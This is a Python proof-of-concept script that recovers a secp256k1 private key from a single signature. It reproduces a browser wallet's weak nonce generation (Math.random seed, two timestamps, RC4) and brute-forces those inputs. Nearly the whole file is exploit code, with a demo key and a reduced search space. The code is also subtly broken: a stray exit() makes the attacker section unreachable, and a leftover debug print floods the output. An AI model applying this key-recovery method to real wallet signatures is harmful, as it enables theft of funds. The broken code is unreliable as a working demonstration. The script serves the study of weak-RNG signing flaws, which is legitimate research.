#!/usr/bin/env python3
"""End-to-end demo (Python port of crack_k.js): recover a private key from ONE
public signature by guessing the weak inputs (Math.random seed + two millisecond
timestamps) this wallet's signing worker fed into k.

The k pipeline mirrors the repo's bitcoinjs.js worker path byte-for-byte:
Math.random() pool fill -> two timestamp mixes -> RC4 keyed by the pool ->
33 bytes -> getBigRandom reduction.
"""
import sys
import time

# ---------- secp256k1 ----------
P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
Gx = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798
Gy = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8


def j_double(Pt):
    X, Y, Z = Pt
    if Y == 0:
        return (0, 0, 0)
    A = (X * X) % P
    B = (Y * Y) % P
    C = (B * B) % P
    D = (2 * (((X + B) * (X + B)) % P - A - C)) % P
    E = (3 * A) % P
    F = (E * E) % P
    X3 = (F - 2 * D) % P
    Y3 = (E * (D - X3) - 8 * C) % P
    Z3 = (2 * Y * Z) % P
    return (X3, Y3, Z3)


def j_add(Pt, Qt):
    if Pt[2] == 0:
        return Qt
    if Qt[2] == 0:
        return Pt
    Z1 = (Pt[2] * Pt[2]) % P
    Z2 = (Qt[2] * Qt[2]) % P
    U1 = (Pt[0] * Z2) % P
    U2 = (Qt[0] * Z1) % P
    S1 = (Pt[1] * Qt[2] * Z2) % P
    S2 = (Qt[1] * Pt[2] * Z1) % P
    if U1 == U2:
        if S1 != S2:
            return (0, 0, 0)
        return j_double(Pt)
    H = (U2 - U1) % P
    I = (4 * H * H) % P
    J = (H * I) % P
    rr = (2 * (S2 - S1)) % P
    V = (U1 * I) % P
    X3 = (rr * rr - J - 2 * V) % P
    Y3 = (rr * (V - X3) - 2 * S1 * J) % P
    Z3 = (((Pt[2] + Qt[2]) * (Pt[2] + Qt[2]) - Z1 - Z2) * H) % P
    return (X3, Y3, Z3)


def mul_x(k, Px, Py):
    """Return affine x-coordinate of k*(Px,Py)."""
    R = (0, 0, 0)
    Q = (Px, Py, 1)
    while k > 0:
        if k & 1:
            R = j_add(R, Q)
        Q = j_double(Q)
        k >>= 1
    if R[2] == 0:
        return None
    zi = pow(R[2], -1, P)
    return (R[0] * (zi * zi % P)) % P


# ---------- weak Math.random() stand-in (MWC1616 family) ----------
def make_weak_random(seed):
    s = [(seed & 0xffff) or 1, ((seed >> 16) & 0xffff) or 2]

    def rand_u32():
        s[0] = (18030 * (s[0] & 0xffff) + (s[0] >> 16)) & 0xffffffff
        s[1] = (30903 * (s[1] & 0xffff) + (s[1] >> 16)) & 0xffffffff
        return ((s[0] << 16) + (s[1] & 0xffff)) & 0xffffffff
    return rand_u32


# ---------- RC4 (Arcfour) ----------
def rc4_init(key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 255
        S[i], S[j] = S[j], S[i]
    return {"i": 0, "j": 0, "S": S}


def rc4_next(st):
    st["i"] = (st["i"] + 1) & 255
    st["j"] = (st["j"] + st["S"][st["i"]]) & 255
    S = st["S"]
    S[st["i"]], S[st["j"]] = S[st["j"]], S[st["i"]]
    return S[(S[st["i"]] + S[st["j"]]) & 255]


# ---------- k pipeline (matches bitcoinjs.js worker path) ----------
def k_from(seed, t1, t2):
    rnd = make_weak_random(seed)
    pool = [0] * 256
    ptr = 0
    while ptr < 256:
        # JS: Math.floor(65536 * (u32 / 2**32)) == u32 >> 16 (exact for ints)
        t = rnd() >> 16
        print(t)
        pool[ptr] = (t >> 8) & 255
        pool[ptr + 1] = t & 255
        ptr += 2

    def seed_int(x, at):
        xi = x & 0xffffffff  # JS bitwise ops work on 32-bit, &255 hides sign
        pool[at] ^= xi & 255
        pool[at + 1] ^= (xi >> 8) & 255
        pool[at + 2] ^= (xi >> 16) & 255
        pool[at + 3] ^= (xi >> 24) & 255

    seed_int(t1, 0)
    seed_int(t2, 4)

    st = rc4_init(pool)
    xb = [rc4_next(st) for _ in range(33)]
    xb[0] = 0
    v = 0
    for b in xb:
        v = (v << 8) | b
    return v % (N - 1) + 1

if __name__ == "__main__":
    # ---------- victim: one signature with SECRET weak inputs ----------
    SECRET_SEED = 0x012D          # unknown to attacker (small demo space)
    T1 = 1377000000101            # unknown exact ms, but narrow window known
    T2 = T1 + 8
    d = 0x9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08  # private key
    z = 0x4a5e1e4baab89f3a32518a88c31bc87f618f76673e2cc77ab2127b7afdeda33b  # message hash

    k_secret = k_from(SECRET_SEED, T1, T2)
    print(k_secret)
    r = mul_x(k_secret, Gx, Gy) % N
    s = (pow(k_secret, -1, N) * (z + r * d)) % N
    pub_x = mul_x(d, Gx, Gy)

    print("Public signature (r, s) and message z are all an attacker sees:")
    print("  r =", hex(r))
    print("  s =", hex(s))
    print("  z =", hex(z))
    print("True private key d =", hex(d))
    print()

    exit()

    # ---------- attacker: guess seed + timestamps, match r, recover d ----------
    A_MAX, B_MAX, SEED_MAX = 3, 12, 0xffff
    print(f"Guessing weak inputs (seed 0..{SEED_MAX}, t1 in a {A_MAX + 1} ms window, "
        f"t2 within {B_MAX} ms)...")
    t0 = time.time()
    tries = 0
    found = None
    for seed in range(SEED_MAX + 1):
        if seed % 200 == 0:
            print(f"  ...tried seeds up to {seed}", end="\r", flush=True)
        for a in range(A_MAX + 1):
            t1 = 1377000000100 + a
            for b in range(1, B_MAX + 1):
                tries += 1
                k = k_from(seed, t1, t1 + b)
                if mul_x(k, Gx, Gy) == r:            # r matches -> right k
                    d_rec = ((s * k - z) * pow(r, -1, N)) % N
                    if mul_x(d_rec, Gx, Gy) == pub_x:
                        found = (seed, t1, t1 + b, k, d_rec)
                        break
            if found:
                break
        if found:
            break

    print()
    if found:
        seed, t1, t2, k, d_rec = found
        secs = round(time.time() - t0, 1)
        space = (SEED_MAX + 1) * (A_MAX + 1) * B_MAX
        print(f"RECOVERED after {tries} guesses in {secs}s")
        print(f"  seed = {hex(seed)}  t1 = {t1}  t2 = {t2}")
        print("  k    =", hex(k))
        print("  d    =", hex(d_rec))
        print("  matches true key:", d_rec == d)
        print(f"  (this demo space is ~2^{round(__import__('math').log2(space))}; "
            "a real 64-bit Math.random state is ~2^64)")
    else:
        print(f"not found in {tries} guesses")
